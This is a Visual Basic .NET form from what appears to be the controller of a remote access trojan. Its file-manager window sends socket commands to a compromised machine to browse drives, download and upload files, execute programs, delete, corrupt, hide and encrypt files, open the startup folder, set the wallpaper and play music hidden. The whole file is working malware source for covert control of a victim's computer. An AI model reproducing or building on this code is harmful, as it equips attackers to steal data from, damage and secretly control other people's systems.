Public Class Form5
    Public sock As Integer
    Public yy As String = "|U|"
    Private Sub Form5_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Form1.S.Send(sock, "GetDrives" & yy) ' Ask Server to Get Drives
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "getdesktoppath")
        Next
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "getstartuppath")
        Next
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "gettemppath")
        Next
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "getmydocumentspath")
        Next
    End Sub

    Private Sub BackToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(sock, "GetDrives" & yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub
    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        Form1.S.Send(sock, "FileManager" & yy & TextBox1.Text)
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub

    Private Sub CorruptFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CorruptFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "corrupt" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.S.Send(sock, "Delete" & yy & "Folder" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.S.Send(sock, "Delete" & yy & "File" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteToolStripMenuItem.Click
        Form1.S.Send(sock, "Execute" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.S.Send(sock, "Rename|U|Folder|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & a)
                Case Else
                    Form1.S.Send(sock, "Rename|U|File|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & a)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "downloadfile" & "|U|" & TextBox1.Text & ListView1.FocusedItem.Text & "|U|" & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "sendfileto" & yy & TextBox1.Text & n.Name & yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "creatnewfolder" & yy & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub HideFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideFolderFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "hidefolderfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowFolderFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "showfolderfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub NewTextFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewTextFileToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The Text File's Name", "Creat New Text File")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "creatnewtextfile" & yy & TextBox1.Text & n & ".txt")
        Next
        RefreshList()
    End Sub

    Private Sub ViewEditTextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewEditTextToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "edittextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CrypteDecryptTextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CrypteDecryptTextToolStripMenuItem.Click
        If Not (ListView1.FocusedItem.Text.EndsWith(".exe") Or ListView1.FocusedItem.Text.EndsWith(".EXE")) Then
            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(sock, "cryptedecryptetextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Next
        Else
            MsgBox("Please Do Not Select an Executable File", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Back1ToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "viewimage" & "|U|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "setaswallpaper" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub PlayMusicHidenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayMusicHidenToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "playmusic" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        System.Diagnostics.Process.Start(Form1.folder)
    End Sub
    Private Sub ListView1_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles ListView1.KeyPress
        Try
            If e.KeyChar = ControlChars.Back Then
                If TextBox1.Text.Length = 3 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ListView1_MouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ListView1.MouseDoubleClick
        Try
            If ListView1.FocusedItem.Index = 0 Then
                If TextBox1.Text.Length < 4 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            Else
                If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += ListView1.FocusedItem.Text
                    Else
                        TextBox1.Text += ListView1.FocusedItem.Text & "\"
                    End If
                    RefreshList()
                Else
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += ListView1.FocusedItem.Text
                    Else
                        TextBox1.Text += ListView1.FocusedItem.Text & "\"
                    End If
                    RefreshList()
                End If
            End If

        Catch ex As Exception
        End Try

    End Sub
End Class